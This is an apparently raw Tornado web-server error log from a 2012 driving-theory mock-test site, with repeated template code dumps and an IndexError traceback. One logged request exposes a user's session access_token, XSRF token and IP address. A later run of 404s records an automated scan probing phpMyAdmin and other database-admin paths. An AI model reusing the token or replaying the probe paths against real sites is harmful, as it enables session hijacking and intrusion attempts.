 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505ca8c88e4c854816f4874a&answers=%5B2%5D&cursor=8&_xsrf=43ea8fce5e674ca7a13037d552738914', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.301924102.1348247947.1348247947.1348247947.1; __utmb=188782963.16.10.1348247947; __utmc=188782963; __utmz=188782963.1348247947.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); access_token="QUFBRzZsTmNzNkdjQkFJdnY0WkJaQ3JEdVZ3Yzh3RWoxUmFkU1pCYU0wdVVQQm5zMTJBMDdUSmlkT2FRa0xMN3Uwdkc5WWNQa0pyWG8xb2ZSd1E1WEpjVWpVQTl5NEV4Q3Q0c2NneG16Z1pEWkQ=|1348247985|bdc640f1e234f73d99fb4834e8ab66e549fc826a"; _xsrf=43ea8fce5e674ca7a13037d552738914', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 87.06ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
WARNING:root:404 GET /h (127.0.0.1) 0.76ms
WARNING:root:404 GET /photos/preview/fb/fb7108.jpg (127.0.0.1) 0.74ms
WARNING:root:404 GET //phpmyadmin/ (127.0.0.1) 0.73ms
WARNING:root:404 GET //phpMyAdmin/ (127.0.0.1) 1.21ms
WARNING:root:404 GET //PHPmyadmin (127.0.0.1) 1.11ms
WARNING:root:404 GET //pma/ (127.0.0.1) 1.26ms
WARNING:root:404 GET //dbadmin/ (127.0.0.1) 1.09ms
WARNING:root:404 GET //myadmin/ (127.0.0.1) 2.72ms
WARNING:root:404 GET //MyAdmin/ (127.0.0.1) 1.17ms
WARNING:root:404 GET //phppgadmin/ (127.0.0.1) 1.08ms
WARNING:root:404 GET //phpmanager/ (127.0.0.1) 1.15ms
WARNING:root:404 GET //db/ (127.0.0.1) 1.27ms
WARNING:root:404 GET //mysql/ (127.0.0.1) 1.11ms
WARNING:root:404 GET /phpMyAdmin/translators.html (127.0.0.1) 0.79ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
